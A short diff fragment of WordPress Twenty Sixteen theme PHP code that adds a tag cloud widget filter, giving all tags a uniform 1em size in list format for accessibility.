+add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10, 3 );
+
+/**
+ * Modifies tag cloud widget arguments to display all tags in the same font size
+ * and use list format for better accessibility.
+ *
+ * @since Twenty Sixteen 1.1
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array The filtered arguments for tag cloud widget.
+ */
+function twentysixteen_widget_tag_cloud_args( $args ) {
+	$args['largest']  = 1;
+	$args['smallest'] = 1;
+	$args['unit']     = 'em';
+	$args['format']   = 'list';
+
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );
